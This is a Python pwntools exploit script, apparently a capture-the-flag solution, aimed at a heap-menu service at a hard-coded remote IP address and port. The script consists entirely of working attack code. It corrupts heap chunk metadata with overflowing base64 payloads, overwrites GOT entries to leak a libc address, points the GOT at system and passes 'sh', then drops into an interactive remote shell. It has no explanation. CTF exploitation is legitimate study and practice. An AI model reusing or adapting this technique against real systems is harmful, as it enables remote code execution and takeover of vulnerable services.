from pwn import *
from base64 import b64encode,b64decode
#r = process(["./d"])
r = remote("47.75.154.113", 9999)
def read(idx,content):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",content)

def edit(idx,content):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))
	r.sendafter(":",content)

def wipe(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))


read(0,"a"*0x34)
read(1,"a"*0x34)
read(2,"a"*0x79)
read(13,"a"*0x45)
wipe(0)
read(0,b64encode("a"*0x28+"\xe1")[:-1])

wipe(1)
wipe(2)
wipe(13)
read(1,b64encode("a"*0x28+p64(0x71)+p64(0x60216d)))
read(2,"a"*0x79)
read(3,b64encode("a"*3+p64(0x602018)+p64(0x602190)+"a"*0x48))
edit(0,p64(0x400770)[:6])
edit(1,"a"*0x40+p64(0x0602020))

wipe(10)
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
print hex(libc)

edit(1,"a"*0x38+p64(0x3c4b53+libc))

edit(9,"\x00"*4)


read(13,b64encode("a"*0x48+p64(0x41)+p64(0x602012)))


puts = libc+0x6f690
system = libc+0x45390
read(12,b64encode("sh\x00").ljust(0x45,"\x01"))
read(11,b64encode(p64(puts)[2:]+p64(system)[:-1]).ljust(0x45,"\x01"))




r.interactive()

